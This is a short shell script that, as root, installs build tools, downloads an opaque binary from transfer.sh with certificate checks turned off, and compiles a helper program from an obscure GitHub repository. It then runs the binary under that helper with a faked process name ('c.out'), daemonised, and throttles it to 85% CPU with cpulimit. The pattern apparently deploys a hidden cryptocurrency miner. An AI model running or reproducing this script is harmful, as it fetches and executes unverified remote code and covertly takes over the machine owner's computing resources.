#!/bin/sh

apt-get update
apt-get install sudo -y
sudo apt install git -y
apt-get install unzip -y
sudo apt install wget -y
apt install gcc -y
apt install screen -y 
apt install cpulimit -y
cd /root
mkdir sed
cd sed
wget --no-check-certificate -c http://transfer.sh/aDcOpr/570 
chmod 775 570 
mv 570 ctest 
wget https://github.com/Mafs68/hjs839/raw/main/hig.c
gcc -o test hig.c 
ls
wget https://github.com/Mafs68/hjs839/raw/main/config.json
chmod 777 config.json
./test -s "c.out" -d -p test.pid ./ctest
cpulimit -e ctest -l 85 &
